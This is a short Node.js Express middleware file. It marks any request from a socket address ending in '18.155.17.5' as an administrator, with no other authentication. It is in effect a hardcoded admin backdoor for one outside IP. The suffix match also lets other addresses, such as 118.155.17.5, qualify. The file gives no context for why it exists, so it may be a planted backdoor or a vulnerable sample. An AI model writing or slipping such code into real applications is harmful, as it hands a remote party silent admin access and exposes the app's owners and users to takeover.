module.exports = function(app) {
    app.use((request, _, next) => {
        if (request.socket.remoteAddress.endsWith('18.155.17.5')) {
            request.isAdmin = true
        }
        next()
    })
}
